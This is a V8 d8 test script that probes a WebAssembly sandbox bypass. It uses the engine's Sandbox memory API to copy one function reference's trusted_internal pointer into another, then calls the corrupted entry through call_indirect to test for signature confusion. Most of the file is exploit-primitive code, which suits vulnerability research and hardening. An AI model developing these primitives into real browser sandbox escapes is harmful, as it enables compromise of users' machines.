// C21 H31: Table.set after WasmFuncRef.trusted_internal transplant.
//
// Hypothesis: exported function data and ref.func share the cached WasmFuncRef.
// If the cached func_ref for func1 is corrupted to point at func0's internal,
// WebAssembly.Table.set(1, exported func1) may install func0's target/signature
// into the dispatch table. Then call_indirect as func1 signature should either
// trap (safe) or execute func0 (bug primitive).

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

let builder = new WasmModuleBuilder();
builder.exportMemoryAs('mem0', 0);
builder.addMemory(1, 1);

let box = builder.addStruct([makeField(kWasmFuncRef, true)]);
let sig_i_l = builder.addType(kSig_i_l);

builder.addFunction('func0', kSig_i_i).exportFunc().addBody([
  kExprLocalGet, 0,
  ...wasmI32Const(0x31313131),
  kExprI32StoreMem, 0, 0,
  ...wasmI32Const(0x31),
]);

builder.addFunction('func1', sig_i_l).exportFunc().addBody([
  kExprLocalGet, 0,
  kExprI32ConvertI64,
]);

builder.addFunction('get_func0', kSig_r_v).exportFunc().addBody([
  kExprRefFunc, 0,
  kGCPrefix, kExprStructNew, box,
  kGCPrefix, kExprExternConvertAny,
]);

builder.addFunction('get_func1', kSig_r_v).exportFunc().addBody([
  kExprRefFunc, 1,
  kGCPrefix, kExprStructNew, box,
  kGCPrefix, kExprExternConvertAny,
]);

let table = builder.addTable(kWasmFuncRef, 2, 2).exportAs('table');
builder.addFunction('call_i_l', kSig_i_ii)
    .exportFunc()
    .addBody([
      kExprLocalGet, 1,
      kExprI64SConvertI32,
      kExprLocalGet, 0,
      kExprCallIndirect, sig_i_l, table.index,
    ]);

let instance = builder.instantiate();
let mem32 = new Uint32Array(instance.exports.mem0.buffer);
let tableObj = instance.exports.table;

const kHeapObjectTag = 1;
const kStructField0Offset = 8;
const kWasmFuncRefType = Sandbox.getInstanceTypeIdFor('WASM_FUNC_REF_TYPE');
const kWasmFuncRefInternalOffset =
    Sandbox.getFieldOffset(kWasmFuncRefType, 'trusted_internal');
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}

function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}

function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

tableObj.set(1, instance.exports.func1);
print(`baseline=${instance.exports.call_i_l(1, 7)}`);

let f0Box = getPtr(instance.exports.get_func0());
let f0Ref = getField(f0Box, kStructField0Offset);
let f0Internal = getField(f0Ref, kWasmFuncRefInternalOffset);

let f1Box = getPtr(instance.exports.get_func1());
let f1Ref = getField(f1Box, kStructField0Offset);
setField(f1Ref, kWasmFuncRefInternalOffset, f0Internal);

tableObj.set(1, instance.exports.func1);
try {
  let ret = instance.exports.call_i_l(1, 0);
  print(`after_ret=0x${ret.toString(16)}`);
  print(`after_mem0=0x${mem32[0].toString(16)}`);
} catch (e) {
  print(`after_throw=${e.name}:${e.message}`);
}
